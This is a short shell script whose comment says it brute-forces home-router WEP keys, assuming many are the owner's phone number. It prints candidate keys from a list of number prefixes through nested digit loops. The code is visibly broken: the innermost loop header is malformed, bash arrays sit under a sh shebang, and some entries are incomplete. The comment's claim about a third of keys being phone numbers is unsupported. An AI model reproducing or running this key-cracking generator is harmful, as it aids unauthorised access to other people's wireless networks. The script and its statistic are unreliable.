# Based off a study that roughly 1/3 of all WEP keys are in fact the home phone number of routers home, we can brute most of the number if we know NPA, we can cut brute force times down.

#!/bin/sh 
w=( "20:32:05:" "20:32:07:" "20:32:40:" "20:32:41:" "20:32:89:" "20:32:97:"
  "20:33:00:" "20:33:12:" "20:33:13:" "20:33:76:" "20:34:24:" "20:34:48:"
  "20:34:60:" "20:34:82:" "20:35:12:" "20:35:33:" "20:35:46:" "20:36:16:"
  "20:36:17:" "20:36:48:" "20:37:02:" "20:37:30:" "20:37:31:" "20:37:39:"
  "20:37:40:"
  "20:"
  "20:"
  "20:"
  "20:")
p=0
k=0
e=0
y=0

for w in "${w[@]}"
do 
	for (( p = 0 ; p <= 9; p++ ))
	do
		for (( k = 0 ; k <= 9; k++ ))
		do
			for (( e = 0 ; e <= 9; e++ ))
			do
				for (( e = 0 ; e <= 9; y <= 9; y++ ))
				do
				key="$w$p$k":"$e$y"
				echo $key
				done
			done
		done
	done
done
